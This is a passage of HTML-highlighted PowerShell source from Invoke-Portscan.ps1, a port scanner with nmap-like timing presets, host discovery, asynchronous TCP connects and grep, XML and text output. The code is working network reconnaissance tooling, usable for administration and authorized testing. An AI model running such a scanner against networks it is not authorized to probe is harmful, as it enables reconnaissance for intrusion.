class="hljs-variable">$T</span>)<br>                &#123;<br>                    <span class="hljs-number">5</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">30</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">1000</span>; <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">750</span> &#125;<br>                    <span class="hljs-number">4</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">25</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">1000</span>; <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">1200</span> &#125;<br>                    <span class="hljs-number">3</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">20</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">100</span>;  <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">2500</span> &#125;<br>                    <span class="hljs-number">2</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">15</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">32</span>;   <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">3000</span> &#125;<br>                    <span class="hljs-number">1</span> &#123;<span class="hljs-variable">$nHosts</span>=<span class="hljs-number">10</span>;  <span class="hljs-variable">$Threads</span> = <span class="hljs-number">32</span>;   <span class="hljs-variable">$Timeout</span> = <span class="hljs-number">5000</span> &#125;<br>                    default &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Invalid T parameter&quot;</span><br>                    &#125;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-variable">$grepStream</span> = <span class="hljs-variable">$null</span><br>            <span class="hljs-variable">$xmlStream</span> = <span class="hljs-variable">$null</span><br>            <span class="hljs-variable">$readableStream</span> = <span class="hljs-variable">$null</span><br><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$AllformatsOut</span>)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$GrepOut</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$XmlOut</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$ReadableOut</span>) &#123;<br>                     <span class="hljs-built_in">Write-Warning</span> <span class="hljs-string">&quot;Both -oA specified with other output... going to ignore -oG/-oN/-oX&quot;</span><br>                &#125;<br>                <span class="hljs-variable">$GrepOut</span> = <span class="hljs-variable">$AllformatsOut</span> + <span class="hljs-string">&quot;.gnmap&quot;</span><br>                <span class="hljs-variable">$XmlOut</span> = <span class="hljs-variable">$AllformatsOut</span> + <span class="hljs-string">&quot;.xml&quot;</span><br>                <span class="hljs-variable">$ReadableOut</span> = <span class="hljs-variable">$AllformatsOut</span> + <span class="hljs-string">&quot;.nmap&quot;</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$GrepOut</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$ForceOverwrite</span> <span class="hljs-operator">-and</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$GrepOut</span>)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Error: <span class="hljs-variable">$AllformatsOut</span> already exists. Either delete the file or specify the -f flag&quot;</span><br>                &#125;<br>                <span class="hljs-variable">$grepStream</span> = [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$GrepOut</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ReadableOut</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$ForceOverwrite</span> <span class="hljs-operator">-and</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$ReadableOut</span>)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Error: <span class="hljs-variable">$ReadableOut</span> already exists. Either delete the file or specify the -f flag&quot;</span><br>                &#125;<br>                <span class="hljs-variable">$readableStream</span> = [<span class="hljs-type">System.IO.StreamWriter</span>] <span class="hljs-variable">$ReadableOut</span><br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$XmlOut</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$ForceOverwrite</span> <span class="hljs-operator">-and</span> (<span class="hljs-built_in">Test-Path</span> <span class="hljs-variable">$XmlOut</span>)) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-string">&quot;Error: <span class="hljs-variable">$XmlOut</span> already exists. Either delete the file or specify the -f flag&quot;</span><br>                &#125;<br><br>                <span class="hljs-variable">$xmlStream</span> =   [<span class="hljs-type">System.xml.xmlwriter</span>]::Create([<span class="hljs-built_in">string</span>]<span class="hljs-variable">$XmlOut</span>)<br>                <span class="hljs-variable">$xmlStream</span>.WriteStartDocument()<br>                <span class="hljs-variable">$xmlStream</span>.WriteStartElement(<span class="hljs-string">&quot;Portscanrun&quot;</span>)<br>                <span class="hljs-variable">$xmlStream</span>.WriteAttributeString(<span class="hljs-string">&quot;version&quot;</span>, <span class="hljs-variable">$version</span>)<br><br>            &#125;<br><br>            Parse<span class="hljs-literal">-Ports</span> <span class="hljs-literal">-Ports</span> <span class="hljs-variable">$DiscoveryPorts</span> <span class="hljs-literal">-pList</span> <span class="hljs-variable">$hostPortList</span> | <span class="hljs-built_in">Out-Null</span><br><br>            <span class="hljs-variable">$startdate</span> = <span class="hljs-built_in">Get-Date</span><br>            <span class="hljs-variable">$myInvocationLine</span> = <span class="hljs-variable">$PSCmdlet</span>.MyInvocation.Line<br>            <span class="hljs-variable">$startMsg</span> = <span class="hljs-string">&quot;Invoke-Portscan.ps1 v<span class="hljs-variable">$version</span> scan initiated <span class="hljs-variable">$startdate</span> as: <span class="hljs-variable">$myInvocationLine</span>&quot;</span><br><br>            <span class="hljs-comment">#TODO deal with output</span><br>            <span class="hljs-built_in">Write-PortscanOut</span> <span class="hljs-literal">-comment</span> <span class="hljs-variable">$startMsg</span> <span class="hljs-literal">-grepStream</span> <span class="hljs-variable">$grepStream</span> <span class="hljs-literal">-xmlStream</span> <span class="hljs-variable">$xmlStream</span> <span class="hljs-literal">-readableStream</span> <span class="hljs-variable">$readableStream</span><br><br>            <span class="hljs-comment"># #converting back from int array gives some argument error checking</span><br>            <span class="hljs-comment"># $sPortList = [string]::join(&quot;,&quot;, $portList)</span><br>            <span class="hljs-comment"># $sHostPortList = [string]::join(&quot;,&quot;, $hostPortList)</span><br><br>            <span class="hljs-comment">########</span><br>            <span class="hljs-comment">#Port Scan Code - run on a per host basis</span><br>            <span class="hljs-comment">########</span><br>            <span class="hljs-variable">$portScanCode</span> = &#123;<br>                <span class="hljs-keyword">param</span> (<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">string</span>] <span class="hljs-variable">$thost</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$SkipDiscovery</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$PingOnly</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">int</span>] <span class="hljs-variable">$Timeout</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$PortList</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] <span class="hljs-variable">$hostPortList</span>,<br>                    [<span class="hljs-type">Parameter</span>( <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)][<span class="hljs-built_in">int</span>] <span class="hljs-variable">$maxthreads</span>)<br>                <span class="hljs-keyword">Process</span><br>                &#123;<br>                <span class="hljs-variable">$openPorts</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>                <span class="hljs-variable">$closedPorts</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br>                <span class="hljs-variable">$filteredPorts</span> = <span class="hljs-built_in">New-Object</span> System.Collections.ArrayList<br><br>                <span class="hljs-variable">$sockets</span> = <span class="hljs-selector-tag">@</span>&#123;&#125;<br>                <span class="hljs-variable">$timeouts</span> = <span class="hljs-built_in">New-Object</span> Hashtable<br><br>                <span class="hljs-comment">#set maximum $async threads</span><br>                <span class="hljs-variable">$fThreads</span> = <span class="hljs-built_in">New-Object</span> int<br>                <span class="hljs-variable">$aThreads</span> = <span class="hljs-built_in">New-Object</span> int<br>                [<span class="hljs-type">System.Threading.ThreadPool</span>]::GetMaxThreads([<span class="hljs-type">ref</span>]<span class="hljs-variable">$fThreads</span>, [<span class="hljs-type">ref</span>]<span class="hljs-variable">$aThreads</span>) | <span class="hljs-built_in">Out-Null</span><br>                [<span class="hljs-type">System.Threading.ThreadPool</span>]::SetMaxThreads(<span class="hljs-variable">$fthreads</span>,<span class="hljs-variable">$maxthreads</span>) | <span class="hljs-built_in">Out-Null</span><br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">New-ScriptBlockCallback</span></span> &#123;<br>                    <span class="hljs-keyword">param</span>(<br>                        [<span class="hljs-type">parameter</span>(<span class="hljs-type">Mandatory</span>=<span class="hljs-variable">$true</span>)]<br>                        [<span class="hljs-type">ValidateNotNullOrEmpty</span>()]<br>                        [<span class="hljs-type">scriptblock</span>]<span class="hljs-variable">$Callback</span><br>                    )<br><br>                    <span class="hljs-comment">#taken from http://www.nivot.org/blog/post/2009/10/09/PowerShell20AsynchronousCallbacksFromNET</span><br>                    <span class="hljs-keyword">if</span> (<span class="hljs-operator">-not</span> (<span class="hljs-string">&quot;CallbackEventBridge&quot;</span> <span class="hljs-operator">-as</span> [<span class="hljs-type">type</span>])) &#123;<br>                        <span class="hljs-built_in">Add-Type</span> <span class="hljs-string">@&quot;</span><br><span class="hljs-string">                            using System;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            public sealed class CallbackEventBridge</span><br><span class="hljs-string">                            &#123;</span><br><span class="hljs-string">                                public event AsyncCallback CallbackComplete = delegate &#123; &#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                private CallbackEventBridge() &#123;&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                private void CallbackInternal(IAsyncResult result)</span><br><span class="hljs-string">                                &#123;</span><br><span class="hljs-string">                                    CallbackComplete(result);</span><br><span class="hljs-string">                                &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                public AsyncCallback Callback</span><br><span class="hljs-string">                                &#123;</span><br><span class="hljs-string">                                    get &#123; return new AsyncCallback(CallbackInternal); &#125;</span><br><span class="hljs-string">                                &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                                public static CallbackEventBridge Create()</span><br><span class="hljs-string">                                &#123;</span><br><span class="hljs-string">                                    return new CallbackEventBridge();</span><br><span class="hljs-string">                                &#125;</span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string">&quot;@</span><br>                    &#125;<br><br>                    <span class="hljs-variable">$bridge</span> = [<span class="hljs-type">CallbackEventBridge</span>]::Create()<br>                    <span class="hljs-built_in">Register-ObjectEvent</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$bridge</span> <span class="hljs-literal">-EventName</span> CallbackComplete <span class="hljs-literal">-Action</span> <span class="hljs-variable">$Callback</span> | <span class="hljs-built_in">Out-Null</span><br><br>                    <span class="hljs-variable">$bridge</span>.Callback<br><br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Test-Port</span></span> &#123;<br><br>                    <span class="hljs-keyword">Param</span> (<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$h</span>,<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$p</span>,<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">int</span>] <span class="hljs-variable">$timeout</span><br>                    )<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-variable">$pAddress</span> = [<span class="hljs-type">System.Net.IPAddress</span>]::Parse(<span class="hljs-variable">$h</span>)<br>                        <span class="hljs-variable">$sockets</span>[<span class="hljs-variable">$p</span>] = <span class="hljs-built_in">new-object</span> System.Net.Sockets.TcpClient <span class="hljs-variable">$pAddress</span>.AddressFamily<br><br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> &#123;<br>                        <span class="hljs-comment">#we&#x27;re assuming this is a host name</span><br>                        <span class="hljs-variable">$sockets</span>[<span class="hljs-variable">$p</span>] = <span class="hljs-built_in">new-object</span> System.Net.Sockets.TcpClient<br>                    &#125;<br><br>                    <span class="hljs-variable">$scriptBlockAsString</span> = <span class="hljs-string">@&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                        #somewhat of a race condition with the timeout, but I don&#x27;t think it matters</span><br><span class="hljs-string">                        if ( `$sockets[<span class="hljs-variable">$p</span>] -ne `$NULL)</span><br><span class="hljs-string">                        &#123;</span><br><span class="hljs-string">                            if (!`$timeouts[<span class="hljs-variable">$p</span>].Disposed) &#123;</span><br><span class="hljs-string">                                `$timeouts[<span class="hljs-variable">$p</span>].Dispose()</span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            `$status = `$sockets[<span class="hljs-variable">$p</span>].Connected;</span><br><span class="hljs-string">                            if (`$status -eq `$True)</span><br><span class="hljs-string">                            &#123;</span><br><span class="hljs-string">                                #write-host &quot;<span class="hljs-variable">$p</span> is open&quot;</span><br><span class="hljs-string">                                `$openPorts.Add(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string">                            else</span><br><span class="hljs-string">                            &#123;</span><br><span class="hljs-string">                                #write-host &quot;<span class="hljs-variable">$p</span> is closed&quot;</span><br><span class="hljs-string">                                `$closedPorts.Add(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            &#125;</span><br><span class="hljs-string">                            `$sockets[<span class="hljs-variable">$p</span>].Close();</span><br><span class="hljs-string"></span><br><span class="hljs-string">                            `$sockets.Remove(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">                        &#125;</span><br><span class="hljs-string">&quot;@</span><br>                    <span class="hljs-variable">$timeoutCallback</span> = <span class="hljs-string">@&quot;</span><br><span class="hljs-string">                        #write-host &quot;<span class="hljs-variable">$p</span> is filtered&quot;</span><br><span class="hljs-string">                        `$sockets[<span class="hljs-variable">$p</span>].Close()</span><br><span class="hljs-string">                        if (!`$timeouts[<span class="hljs-variable">$p</span>].Disposed) &#123;</span><br><span class="hljs-string">                            `$timeouts[<span class="hljs-variable">$p</span>].Dispose()</span><br><span class="hljs-string">                            `$filteredPorts.Add(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">                        &#125;</span><br><span class="hljs-string">                        `$sockets.Remove(<span class="hljs-variable">$p</span>)</span><br><span class="hljs-string">&quot;@</span><br><br>                    <span class="hljs-variable">$timeoutCallback</span> = [<span class="hljs-type">scriptblock</span>]::Create(<span class="hljs-variable">$timeoutCallback</span>)<br><br>                    <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>] = <span class="hljs-built_in">New-Object</span> System.Timers.Timer<br>                    <span class="hljs-built_in">Register-ObjectEvent</span> <span class="hljs-literal">-InputObject</span> <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>] <span class="hljs-literal">-EventName</span> Elapsed <span class="hljs-literal">-Action</span> <span class="hljs-variable">$timeoutCallback</span> | <span class="hljs-built_in">Out-Null</span><br>                    <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>].Interval = <span class="hljs-variable">$timeout</span><br>                    <span class="hljs-variable">$timeouts</span>[<span class="hljs-variable">$p</span>].Enabled = <span class="hljs-variable">$true</span><br><br>                    <span class="hljs-variable">$myscriptblock</span> = [<span class="hljs-type">scriptblock</span>]::Create(<span class="hljs-variable">$scriptBlockAsString</span>)<br>                    <span class="hljs-variable">$Null</span> = <span class="hljs-variable">$sockets</span>[<span class="hljs-variable">$p</span>].beginConnect(<span class="hljs-variable">$h</span>, <span class="hljs-variable">$p</span>,(<span class="hljs-built_in">New-ScriptBlockCallback</span>(<span class="hljs-variable">$myscriptblock</span>)) , <span class="hljs-variable">$null</span>)<br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">PortScan-Alive</span></span><br>                &#123;<br>                    <span class="hljs-keyword">Param</span> (<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$h</span><br>                    )<br><br>                    <span class="hljs-keyword">Try</span><br>                    &#123;<br><br>                        <span class="hljs-comment">#ping</span><br>                        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$hostPortList</span>.Contains(<span class="hljs-literal">-1</span>))<br>                        &#123;<br>                            <span class="hljs-variable">$ping</span> = <span class="hljs-built_in">new-object</span> System.Net.NetworkInformation.Ping<br>                            <span class="hljs-variable">$pResult</span> = <span class="hljs-variable">$ping</span>.send(<span class="hljs-variable">$h</span>)<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pResult</span>.Status <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;Success&quot;</span>)<br>                            &#123;<br>                                <span class="hljs-keyword">return</span> <span class="hljs-variable">$True</span><br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Port</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$hostPortList</span>)<br>                        &#123;<br>                            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$Port</span> <span class="hljs-operator">-ne</span> <span class="hljs-literal">-1</span>)<br>                            &#123;<br>                                <span class="hljs-built_in">Test-Port</span> <span class="hljs-literal">-h</span> <span class="hljs-variable">$h</span> <span class="hljs-literal">-p</span> <span class="hljs-variable">$Port</span> <span class="hljs-literal">-timeout</span> <span class="hljs-variable">$Timeout</span><br>                            &#125;<br>                        &#125;<br><br>                        <span class="hljs-keyword">do</span> &#123;<br>                            <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milli</span> <span class="hljs-number">100</span><br>                            <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$openPorts</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>) <span class="hljs-operator">-or</span> (<span class="hljs-variable">$closedPorts</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>)) &#123;<br>                                <span class="hljs-keyword">return</span> <span class="hljs-variable">$True</span><br>                            &#125;<br>                        &#125;<br>                        <span class="hljs-keyword">While</span> (<span class="hljs-variable">$sockets</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>)<br><br>                    &#125;<br>                    <span class="hljs-keyword">Catch</span><br>                    &#123;<br>                        <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Exception trying to host scan <span class="hljs-variable">$h</span>&quot;</span><br>                        <span class="hljs-built_in">Write-Error</span> <span class="hljs-variable">$_</span>.Exception.Message;<br>                    &#125;<br><br>                    <span class="hljs-keyword">return</span> <span class="hljs-variable">$False</span><br>                &#125;<br><br>                <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Portscan-Port</span></span><br>                &#123;<br>                    <span class="hljs-keyword">Param</span> (<br>                        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-built_in">String</span>] <span class="hljs-variable">$h</span><br>                    )<br><br>                    [<span class="hljs-built_in">string</span>[]]<span class="hljs-variable">$Ports</span> = <span class="hljs-selector-tag">@</span>()<br><br>                    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$Port</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$Portlist</span>)<br>                    &#123;<br>                        <span class="hljs-keyword">Try</span><br>                        &#123;<br>                            <span class="hljs-built_in">Test-Port</span> <span class="hljs-literal">-h</span> <span class="hljs-variable">$h</span> <span class="hljs-literal">-p</span> <span class="hljs-variable">$Port</span> <span class="hljs-literal">-timeout</span> <span class="hljs-variable">$Timeout</span><br>                        &#125;<br>                        <span class="hljs-keyword">Catch</span><br>                        &#123;<br>                            <span class="hljs-built_in">Write-Error</span> <span class="hljs-string">&quot;Exception trying to scan <span class="hljs-variable">$h</span> port <span class="hljs-variable">$Port</span>&quot;</span><br>                            <span class="hljs-built_in">Write-Error</span> <span class="hljs-variable">$_</span>.Exception.Message;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>                [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$hostResult</span> = <span class="hljs-variable">$False</span><br><br>                <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$SkipDiscovery</span>)<br>                &#123;<br>                    [<span class="hljs-built_in">bool</span>] <span class="hljs-variable">$hostResult</span> = PortScan<span class="hljs-literal">-Alive</span> <span class="hljs-variable">$thost</span><br>                    <span class="hljs-variable">$openPorts</span>.clear()<br>                    <span class="hljs-variable">$closedPorts</span>.clear()<br>                    <span class="hljs-variable">$filteredPorts</span>.Clear()<br>                &#125;<br>                <span class="hljs-keyword">if</span>((!<span class="hljs-variable">$PingOnly</span>) <span class="hljs-operator">-and</span> (<span class="hljs-variable">$hostResult</span> <span class="hljs-operator">-or</span> <span class="hljs-variable">$SkipDiscovery</span>))<br>                &#123;<br>                    Portscan<span class="hljs-literal">-Port</span> <span class="hljs-variable">$thost</span><br>                &#125;<br>                <span class="hljs-keyword">while</span> (<span class="hljs-variable">$sockets</span>.Count <span class="hljs-operator">-gt</span> <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milli</span> <span class="hljs-number">500</span><br>                &#125;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$hostResult</span>, <span class="hljs-variable">$openPorts</span>, <span class="hljs-variable">$closedPorts</span>, <span class="hljs-variable">$filteredPorts</span>)<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment"># the outer loop is to flush the loop.</span><br>            <span class="hljs-comment"># Otherwise Get-Job | Wait-Job could clog, etc</span><br><br>            [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$saveIteration</span> = <span class="hljs-number">0</span><br>            [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$computersDone</span>=<span class="hljs-number">0</span><br>            [<span class="hljs-built_in">int</span>]<span class="hljs-variable">$upHosts</span>=<span class="hljs-number">0</span><br>            <span class="hljs-keyword">while</span> ((<span class="hljs-variable">$saveIteration</span> * <span class="hljs-variable">$SyncFreq</span>) <span class="hljs-operator">-lt</span> <span class="hljs-variable">$hostList</span>.Count)<br>            &#123;<br><br>                <span class="hljs-built_in">Get-Job</span> | <span class="hljs-built_in">Remove-Job</span> <span class="hljs-literal">-Force</span><br>                <span class="hljs-variable">$sIndex</span> = (<span class="hljs-variable">$saveIteration</span>*<span class="hljs-variable">$SyncFreq</span>)<br>                <span class="hljs-variable">$eIndex</span> = ((<span class="hljs-variable">$saveIteration</span>+<span class="hljs-number">1</span>)*<span class="hljs-variable">$SyncFreq</span>)<span class="hljs-literal">-1</span><br><br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$iHost</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$hostList</span>[<span class="hljs-variable">$sIndex</span><span class="hljs-type">..</span><span class="hljs-variable">$eIndex</span>])<br>                &#123;<br>                    <span class="hljs-variable">$ctr</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-built_in">Get-Job</span> <span class="hljs-literal">-state</span> Running)<br>                    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$ctr</span>.Count <span class="hljs-operator">-ge</span> <span class="hljs-variable">$nHosts</span>)<br>                    &#123;<br>                        <span class="hljs-built_in">Start-Sleep</span> <span class="hljs-literal">-Milliseconds</span> <span class="hljs-variable">$SleepTimer</span><br>                        <span class="hljs-variable">$ctr</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-built_in">Get-Job</span> <span class="hljs-literal">-state</span> Running)<br>                    &#125;<br><br>                    <span class="hljs-variable">$computersDone</span>++<br>                    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$noProgressMeter</span>)<br>                    &#123;<br>                        <span class="hljs-built_in">Write-Progress</span> <span class="hljs-literal">-status</span> <span class="hljs-string">&quot;Port Scanning&quot;</span> <span class="hljs-literal">-Activity</span> <span class="hljs-variable">$startMsg</span> <span class="hljs-literal">-CurrentOperation</span> <span class="hljs-string">&quot;starting computer <span class="hljs-variable">$computersDone</span>&quot;</span>  <span class="hljs-literal">-PercentComplete</span> (<span class="hljs-variable">$computersDone</span> / <span class="hljs-variable">$hostList</span>.Count * <span class="hljs-number">100</span>)<br>                    &#125;<br><br>                    <span class="hljs-built_in">Start-Job</span> <span class="hljs-literal">-ScriptBlock</span> <span class="hljs-variable">$portScanCode</span> <span class="hljs-literal">-Name</span> <span class="hljs-variable">$iHost</span> <span class="hljs-literal">-ArgumentList</span> <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$iHost</span>, <span class="hljs-variable">$SkipDiscovery</span>, <span class="hljs-variable">$PingOnly</span>, <span class="hljs-variable">$Timeout</span>, <span class="hljs-variable">$portList</span>, <span class="hljs-variable">$hostPortList</span>, <span class="hljs-variable">$Threads</span>)  | <span class="hljs-built_in">Out-Null</span><br>                &#125;<br><br>                <span class="hljs-built_in">Get-Job</span> | <span class="hljs-built_in">Wait-Job</span> | <span class="hljs-built_in">Out-Null</span><br><br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$job</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">Get-Job</span>)<br>                &#123;<br>                    <span class="hljs-variable">$jobOut</span> = <span class="hljs-selector-tag">@</span>(<span class="hljs-built_in">Receive-Job</span> <span class="hljs-variable">$job</span>)<br>                    [<span class="hljs-built_in">bool</span>]<span class="hljs-variable">$hostUp</span> = <span class="hljs-variable">$jobOut</span>[<span class="hljs-number">0</span>]<br>                    <span class="hljs-variable">$jobName</span> = <span class="hljs-variable">$job</span>.Name<br><br>                    <span class="hljs-variable">$openPorts</span> = <span class="hljs-variable">$jobOut</span>[<span class="hljs-number">1</span>]<br>                    <span class="hljs-variable">$closedPorts</span> = <span class="hljs-variable">$jobOut</span>[<span class="hljs-number">2</span>]<br>                    <span class="hljs-variable">$filteredPorts</span> = <span class="hljs-variable">$jobOut</span><span class="hljs-function">[<span class="hljs-number">3</span>]</span><br><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$hostUp</span>) &#123;<br>                        <span class="hljs-variable">$upHosts</span> ++<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$quiet</span>)<br>                    &#123;<br>                        <span class="hljs-variable">$hostDate</span> = <span class="hljs-built_in">Get-Date</span><br>                        <span class="hljs-variable">$hostObj</span> = <span class="hljs-built_in">New-Object</span> System.Object<br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> Hostname <span class="hljs-literal">-Value</span> <span class="hljs-variable">$jobName</span><br><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> alive <span class="hljs-literal">-Value</span> <span class="hljs-variable">$hostUp</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> openPorts <span class="hljs-literal">-Value</span> <span class="hljs-variable">$openPorts</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> closedPorts <span class="hljs-literal">-Value</span> <span class="hljs-variable">$closedPorts</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> Noteproperty <span class="hljs-literal">-Name</span> filteredPorts <span class="hljs-literal">-Value</span> <span class="hljs-variable">$filteredPorts</span><br>                        <span class="hljs-variable">$hostObj</span> | <span class="hljs-built_in">Add-Member</span> <span class="hljs-literal">-MemberType</span> NoteProperty <span class="hljs-literal">-Name</span> finishTime <span class="hljs-literal">-Value</span> <span class="hljs-variable">$hostDate</span><br><br>                        <span class="hljs-variable">$scannedHostList</span> += <span class="hljs-variable">$hostobj</span><br>                    &#125;<br><br>                    <span class="hljs-built_in">Write-PortscanOut</span> <span class="hljs-literal">-outhost</span> <span class="hljs-variable">$jobName</span> <span class="hljs-literal">-isUp</span> <span class="hljs-variable">$hostUp</span> <span class="hljs-literal">-openPorts</span> <span class="hljs-variable">$openPorts</span> <span class="hljs-literal">-closedPorts</span> <span class="hljs-variable">$closedPorts</span> <span class="hljs-literal">-filteredPorts</span> <span class="hljs-variable">$filteredPorts</span> <span class="hljs-literal">-grepStream</span> <span 